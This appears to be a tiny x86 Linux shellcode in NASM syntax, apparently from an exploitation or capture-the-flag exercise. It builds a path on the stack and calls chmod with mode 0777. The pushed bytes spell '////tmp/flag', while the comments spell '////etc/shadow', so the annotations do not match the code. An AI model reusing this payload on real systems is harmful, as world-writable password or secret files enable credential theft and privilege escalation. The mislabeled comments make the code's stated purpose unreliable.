bits 32
section .text
global _start

_start:
  mov ebx, eax
  xor eax, ebx
  push dword eax
  ; mov dword [esp-4],  0x67616c66 ; galf
  ; mov dword [esp-8],  0x2f2f2f2f ; ////
  mov dword [esp-4],  0x67616c66 ; woda
  mov dword [esp-8],  0x2f706d74 ; hs/c
  mov dword [esp-12], 0x2f2f2f2f ; te//
  sub esp, 12
  mov ebx,esp
  push word  0x1ff
  pop cx
  mov al,0xf
  int 0x80
